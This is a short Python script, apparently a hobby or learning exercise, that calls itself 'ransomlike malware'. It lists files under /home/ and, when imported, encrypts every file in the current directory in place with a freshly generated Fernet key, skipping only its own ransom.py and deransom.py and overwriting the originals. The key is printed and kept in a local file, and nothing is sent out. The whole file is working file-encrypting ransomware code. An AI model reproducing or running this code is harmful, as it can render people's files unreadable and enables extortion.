import os

from cryptography.fernet import Fernet


def get_all_files():
    path = "/home/"
    # we shall store all the file names in this list
    filelist = []

    # commanded line in the below is faster
    for root, dirs, files in os.walk(path):
        for file in files:
            # append the file name to the list
            filelist.append(os.path.join(root, file))
    return filelist
    # return [os.path.join(root,file) for root, dirs, files in os.walk(path) for file in files]


def get_only_that_files():
    # gather every file, not folder or directionary!
    filelist = os.listdir()

    # do not include our main files
    #   that crypt, decrypt or key files
    for item in filelist:
        if item == "ransom.py" or item == "deransom.py":
            filelist.remove(item)
    return filelist[:-1]


def main():
    filelist = get_only_that_files()

    # create and save the key for ransomlike malware
    key = Fernet.generate_key()
    print("KEY: " + str(key))

    doc = open("key", "wb")
    doc.write(key)
    doc.close()

    # crypt the files with key we just generated
    for item in filelist:
        doc = open(item, "rb")
        data = doc.read()
        doc.close()

        cripted_data = Fernet(key).encrypt(data)

        doc = open(item, "wb")
        doc.write(cripted_data)
        doc.close()


if __name__ == "__main__":
    test = get_all_files()
    print(str(test))
else:
    main()
